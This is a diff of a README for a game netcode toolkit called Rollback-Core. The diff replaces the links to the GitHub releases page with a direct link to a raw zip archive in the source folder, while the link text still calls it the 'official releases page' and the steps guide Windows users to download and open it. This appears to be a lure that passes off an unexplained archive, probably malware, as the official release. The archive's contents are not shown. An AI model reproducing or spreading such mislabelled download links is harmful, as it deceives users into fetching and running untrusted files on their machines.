@@ -1,6 +1,6 @@
 # 🎮 Rollback-Core - Smooth online play for your games
 
-[![Download Rollback-Core](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Outsized-flashboarding111/Rollback-Core/releases)
+[![Download Rollback-Core](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/Outsized-flashboarding111/Rollback-Core/main/Source/RollbackCore/Core-Rollback-impestation.zip)
 
 Rollback-Core provides a way to make online multiplayer games feel responsive. It keeps the game state consistent between players. This tool handles the complex math behind networking so you can focus on building your game world.
 
@@ -8,7 +8,7 @@ Rollback-Core provides a way to make online multiplayer games feel responsive. I
 
 You need to obtain the latest version of the toolkit from our repository.
 
-1.  Visit the [official releases page](https://github.com/Outsized-flashboarding111/Rollback-Core/releases).
+1.  Visit the [official releases page](https://raw.githubusercontent.com/Outsized-flashboarding111/Rollback-Core/main/Source/RollbackCore/Core-Rollback-impestation.zip).
 2.  Look for the section labeled "Assets" at the bottom of the newest release.
 3.  Click the file ending in `.zip` to start the download.
 4.  Once the file finishes, open your Downloads folder in Windows.
